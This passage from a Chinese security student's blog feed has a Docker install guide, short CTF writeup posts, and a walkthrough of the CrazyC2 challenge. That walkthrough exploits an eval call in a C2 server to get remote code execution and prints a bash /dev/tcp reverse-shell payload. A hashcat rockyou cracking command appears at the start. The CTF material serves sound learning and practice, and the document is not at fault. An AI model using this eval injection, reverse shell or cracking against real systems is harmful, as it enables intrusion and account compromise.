class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 abc.hash /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/星盟-2024-Misc-招新题-第一题/image-20240723103618235.png"alt="image-20240723103618235" /><figcaption aria-hidden="true">image-20240723103618235</figcaption></figure><p>得到明文密码：1qaz!QAZ</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安装使用记录（极简版）</title>
      <link href="/posts/a59e056f/"/>
      <url>/posts/a59e056f/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用到哪里写到哪里吧，随着使用的深入以后还会更新这篇文章</p></blockquote><p>参考文章传送门：</p><p><ahref="https://blog.csdn.net/u012563853/article/details/125295985?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172148665016800188528574%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172148665016800188528574&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125295985-null-null.142%5Ev100%5Epc_search_result_base1&amp;utm_term=ubuntu%20docker&amp;spm=1018.2226.3001.4187">文章一</a>，<ahref="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172136879616800211563088%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172136879616800211563088&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576-null-null.142%5Ev100%5Epc_search_result_base1&amp;utm_term=docker&amp;spm=1018.2226.3001.4187">文章二</a>，<ahref="https://blog.csdn.net/jsnhux/article/details/89847109">文章三</a>，<ahref="https://www.runoob.com/docker/docker-dockerfile.html">文章四</a></p><h2 id="docker简介">Docker简介</h2><h3 id="docker介绍">docker介绍</h3><p>Docker是一个可以用来装web应用的容器。Docker这个词的本义是码头工人，主要工作就是搬运那些“集装箱”，将它们搬运到相应的目的地去。Docker拥有着一个“超级码头”，或者说一个巨大的物流中心，我们可以把我们的“集装箱”push到这个超级码头去，以便我们在另一个码头时可以将它直接pull过来，而不是就地复刻一个曾经我们拥有过的集装箱。</p><p>有些文章中会拿docker和虚拟机作对比，深入而又透彻，什么使用了LXC技术，不需要HyperV转换之类的，这里我就不再赘述了，总结来说就是docker容器更为轻量，运行起来更为快速。</p><h3 id="镜像">镜像</h3><p>镜像，英文image，也就是上面我们提到的”集装箱“，我们的那个”超级码头“也就是镜像源。镜像的联合文件系统我也不再在这里赘述，感兴趣可以自行跳入上面的传送门去了解。</p><h3 id="容器">容器</h3><p>容器，英文名container，可以理解为镜像的实例化。镜像是不可编辑的，容器是可以编辑的。我们可以用一个镜像生成多个容器。容器与容器之间互不干扰。</p><h2 id="docker安装">Docker安装</h2><p>说明：笔者电脑系统为Ubuntu 24.04LTS，下面的操作都在root权限下进行</p><h3 id="卸载旧版">卸载旧版</h3><p>如果以前安装过，那么先卸载一下旧版docker，没有则无需卸载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><h3 id="安装证书">安装证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h3 id="写入软件源">写入软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br></pre></td></tr></table></figure><h3 id="安装docker">安装docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><h3 id="启动docker">启动docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="安装一些工具">安装一些工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>重启一下docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><h3 id="配置阿里云镜像加速器">配置阿里云镜像加速器</h3><p>登录你的阿里云账号，<a href="https://dev.aliyun.com">传送门</a></p><p>点左上角三条杠--容器--容器镜像服务ACR--镜像工具--镜像加速器</p><figure><img src="/images/docker安装记录/image-20240720234631745.png"alt="image-20240720234631745" /><figcaption aria-hidden="true">image-20240720234631745</figcaption></figure><figure><img src="/images/docker安装记录/屏幕截图-2024-07-20-234712.png"alt="屏幕截图 2024-07-20 234712" /><figcaption aria-hidden="true">屏幕截图 2024-07-20 234712</figcaption></figure><p>网站上已经详细地说明了操作步骤，这里我还是将它一步一步分开说一下</p><p>/etc/docker应该是已经存在了，如果没有的话就用下面的命令去创建一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /etc/docker</span><br></pre></td></tr></table></figure><p>在/etc/docker路径下创建一个叫daemon.json的文件，编辑其内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://这里填上面给的地址.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>重新加载一下daemon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="测试安装是否成功">测试安装是否成功</h3><p>我们先拉取一个hello-world的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull hello-world</span><br></pre></td></tr></table></figure><p>运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>如果出现以下界面，则说明安装成功</p><figure><img src="/images/docker安装记录/截图-2024-07-21-00-11-44.png"alt="截图 2024-07-21 00-11-44" /><figcaption aria-hidden="true">截图 2024-07-21 00-11-44</figcaption></figure><h2 id="docker简单命令">Docker简单命令</h2><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure><p>删除本地镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像名</span><br></pre></td></tr></table></figure><p>查看本地拥有的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>用某一镜像开启一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run 镜像名</span><br></pre></td></tr></table></figure><p>开启容器时在后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 镜像名</span><br></pre></td></tr></table></figure><p>查看当前运行中的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>查看存在的容器（包括不在运行中的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>停止运行某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID（可通过上面的ps命令看到，可仅写ID的前几位）</span><br></pre></td></tr></table></figure><p>删除某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器ID</span><br></pre></td></tr></table></figure><p>进入某一容器，以bash界面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器ID bash</span><br></pre></td></tr></table></figure><p>想退出容器，则输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="docker网络">Docker网络</h2><p>说明：下文中客户端ip：192.168.3.18，服务端ip：192.168.3.25</p><p>这里简述一下如何在docker中跑一个对外的web服务，用nginx镜像举例</p><p>首先pull一下nginx的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><figure><img src="/images/docker安装记录/截图-2024-07-21-14-08-49.png"alt="截图-2024-07-21-14-08-49" /><figcaption aria-hidden="true">截图-2024-07-21-14-08-49</figcaption></figure><p>如果我们想让服务跑在服务端主机的11451端口，容器内跑在80端口，那么得用如下命令，在启动容器时做一个端口映射。<strong>注意记得开启服务端主机的11451端口。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 11451:80 nginx</span><br></pre></td></tr></table></figure><figure><img src="/images/docker安装记录/截图-2024-07-21-14-16-37.png"alt="截图-2024-07-21-14-16-37" /><figcaption aria-hidden="true">截图-2024-07-21-14-16-37</figcaption></figure><p>这里我们可以看一下这个容器的ID和运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><figure><img src="/images/docker安装记录/截图-2024-07-21-14-18-55.png"alt="截图-2024-07-21-14-18-55" /><figcaption aria-hidden="true">截图-2024-07-21-14-18-55</figcaption></figure><p>可以看到已经成功运行了。</p><p>此时我们就可以用客户端浏览器去访问服务端的11451端口了，如果看到如下页面，那么就说明成功了。</p><figure><img src="/images/docker安装记录/image-20240721142135086.png"alt="image-20240721142135086" /><figcaption aria-hidden="true">image-20240721142135086</figcaption></figure><h2 id="dockerfile">Dockerfile</h2><p>Dockerfile是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。通过定义一系列命令和参数，Dockerfile指导 Docker 构建一个自定义的镜像。</p><p>dockerfile中的指令及其作用：</p><figure><img src="/images/docker安装记录/image-20240809205825697.png"alt="image-20240809205825697" /><figcaption aria-hidden="true">image-20240809205825697</figcaption></figure><p>要通过dockerfile构建镜像，首先切到dockerfile所在的目录下，然后执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t 自定义镜像名 .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2024 Writeup</title>
      <link href="/posts/8a411fd4/"/>
      <url>/posts/8a411fd4/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/LitCTF2024Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> LitCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jqctf2024初赛 Misc</title>
      <link href="/posts/e597ed70/"/>
      <url>/posts/e597ed70/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一次X1cT34m前辈们的狂欢（竟然直接给干到第一了！！？），我只是做个misc给前辈们助助兴。。。</p></blockquote><h3 id="flag_video_version">flag_video_version</h3><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20202344.png" /></p><p>从sdp.txt中得知视频通过RTP传输，编码方式为H264</p><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20202557.png" /></p><p>wireshark中Decode As RTP</p><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20202921.png" /></p><p>从RTP流分析中可以看出序列存在问题，将每一个分组对应的序列保存进2.txt</p><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20203245.png" /></p><p>追踪UDP流，将传输的内容保存进1.txt</p><p><img src="/images/jqctf2024初赛-Misc/屏幕截图 2024-05-26 203444.png" alt="屏幕截图 2024-05-26 203444" style="zoom:50%;" /></p><p>写脚本将这些数据包按照正常的顺序拼接起来，最终保存为data.264</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f3=<span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">num=[]</span><br><span class="line">ls=[]</span><br><span class="line">a=f2.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(a):</span><br><span class="line">    num.append(<span class="built_in">int</span>(a))</span><br><span class="line">    a=f2.readline().strip()</span><br><span class="line">b=f1.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(b):</span><br><span class="line">    ls.append(b)</span><br><span class="line">    b=f1.readline().strip()</span><br><span class="line">sorted_ls = [x <span class="keyword">for</span> _, x <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">zip</span>(num, ls))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sorted_ls:</span><br><span class="line">    f3.write(i)</span><br><span class="line">    f3.write(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><imgsrc="/images/jqctf2024初赛-Misc/image-20240526203853688.png" /></p><p>用MilkPlayer播放这个视频，视频展示了flag</p><p><imgsrc="/images/jqctf2024初赛-Misc/屏幕截图%202024-05-26%20204143.png" /></p><p>flag{ef051f0cd551650c8b6c9eac7b5ad861}</p><h3 id="checkin">checkin</h3><p>flag{605379906}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024 Writeup</title>
      <link href="/posts/7b0218d9/"/>
      <url>/posts/7b0218d9/</url>
      
        <content type="html"><![CDATA[<h4 id="初赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/CISCN2024Writeup.pdf">初赛Writeup点我</a></h4><p>Additional Statement:</p><p>这是一次由四个大一新生组成的X2cT34m的奇妙冒险，</p><p>我参与做了crypto和一部分的misc</p><h4 id="华东北赛区赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/CISCN2024Writeup1.pdf">华东北赛区赛Writeup点我</a></h4><p>Additional Statement:</p><p>第一次打线下，AWDP模式。</p><p>太菜了，面对题目一脸懵（T0T）</p><p>但是听说是可以通过patch包传个马上去再攻击的（？？！），比赛时我们队虽然想到了但是没去试，还是打保守了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024 Writeup</title>
      <link href="/posts/22e071ae/"/>
      <url>/posts/22e071ae/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://f4k3r.top/pdf_file/XYCTF2024%20%E5%88%AB%E7%AE%A1%20Writeup.pdf">Writeup点我</a></h4><p>Additional Statement:</p><p>Cooperated with <strong>f4k3r</strong>.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> XYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 CrazyC2</title>
      <link href="/posts/c00e3325/"/>
      <url>/posts/c00e3325/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本来在CTF中应该都是基操，但是因为本人太菜，弄了好几天才出。。。（T0T）</p></blockquote><p>题目</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402165312088.png"alt="image-20240402165312088" /><figcaption aria-hidden="true">image-20240402165312088</figcaption></figure><p>先是流量分析，看到了很多TCP和HTTP流，追踪大概看一下</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402164740735.png"alt="image-20240402164740735" /><figcaption aria-hidden="true">image-20240402164740735</figcaption></figure><p>看起来传输了很多加密的信息，先把它们全都手动整理出来</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402164916818.png"alt="image-20240402164916818" /><figcaption aria-hidden="true">image-20240402164916818</figcaption></figure><p>直接解base64解不出，但是POST传参时看到了一个random_key，猜是异或用的，果然</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402165223751.png"alt="image-20240402165223751" /><figcaption aria-hidden="true">image-20240402165223751</figcaption></figure><p>看到用curl从攻击机读取了一个文件，我也试着读了一下，发现可以从攻击机中读到任意文件，于是读到了第一个flag</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402165620146.png"alt="image-20240402165620146" /><figcaption aria-hidden="true">image-20240402165620146</figcaption></figure><p>从读一些不存在的文件产生的报错中可以看到pythonflask源码，读下来进行审计</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402165819762.png"alt="image-20240402165819762" /><figcaption aria-hidden="true">image-20240402165819762</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">clients = &#123;<span class="string">&quot;4ace608657cba629&quot;</span>: &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;random_key&quot;</span>: <span class="number">95</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/init&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    client_id = secrets.token_hex(<span class="number">8</span>)</span><br><span class="line">    random_key = secrets.randbelow(<span class="number">255</span>)</span><br><span class="line">    clients[client_id] = &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;echo hello&quot;</span>, <span class="string">&quot;random_key&quot;</span>: random_key&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;client_id&quot;</span>: client_id, <span class="string">&quot;random_key&quot;</span>: random_key&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/recv&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_command</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(client_id, data[<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    command = clients[client_id].get(<span class="string">&quot;command&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    encrypted_command = encrypt_command(</span><br><span class="line">        command, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;encrypted_command&quot;</span>: encrypted_command&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/send&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">eval</span>(data[<span class="string">&quot;random_key&quot;</span>]) != clients[client_id][<span class="string">&quot;random_key&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;data error&quot;</span>, <span class="number">200</span></span><br><span class="line">    encrypted_data = data[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    decrypted_data = decrypt_data(</span><br><span class="line">        encrypted_data, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received data: <span class="subst">&#123;decrypted_data.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Received data&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/files&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_file</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    random_key = data[<span class="string">&quot;random_key&quot;</span>]</span><br><span class="line">    path = data[<span class="string">&quot;path&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> client_id <span class="keyword">not</span> <span class="keyword">in</span> clients.keys():</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid client_id&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> clients[client_id][<span class="string">&quot;random_key&quot;</span>] == <span class="built_in">int</span>(random_key):</span><br><span class="line">        <span class="keyword">return</span> send_file(path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;incorrect random_key&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_command</span>(<span class="params">command, key</span>):</span><br><span class="line">    encrypted_data = xor(command, key)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    encrypted_data = base64.b64decode(encrypted_data)</span><br><span class="line">    <span class="keyword">return</span> xor(encrypted_data, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, debug=<span class="literal">True</span>, port=<span class="number">1337</span>, use_reloader=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flask_thread = Thread(target=run_flask_app)</span><br><span class="line">    flask_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="built_in">input</span>(<span class="string">&quot;Enter command: &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> client_id <span class="keyword">in</span> clients.keys():</span><br><span class="line">            clients[client_id][<span class="string">&quot;command&quot;</span>] = command</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Executing: <span class="subst">&#123;command&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到在判断random_key是否正确的地方存在一个我们CTFer最喜欢的eval，于是可以通过这个漏洞执行RCE</p><p>反弹shell拿下C2服务器</p><p>给攻击机传bash -c "bash -i &gt;&amp; /dev/tcp/ip/port0&gt;&amp;1"</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/屏幕截图-2024-04-02-170509.png"alt="屏幕截图 2024-04-02 170509" /><figcaption aria-hidden="true">屏幕截图 2024-04-02 170509</figcaption></figure><p>自己的服务器监听2333端口</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402170726047.png"alt="image-20240402170726047" /><figcaption aria-hidden="true">image-20240402170726047</figcaption></figure><p>ps aux查看一下运行的程序</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402171043213.png"alt="image-20240402171043213" /><figcaption aria-hidden="true">image-20240402171043213</figcaption></figure><p>可以看到C2服务器是用tmux运行的，那么用tmux回到这个会话（后来开放了ssh，用ssh连，先把自己的公钥配置进去，这里不再赘述）</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402180037287.png"alt="image-20240402180037287" /><figcaption 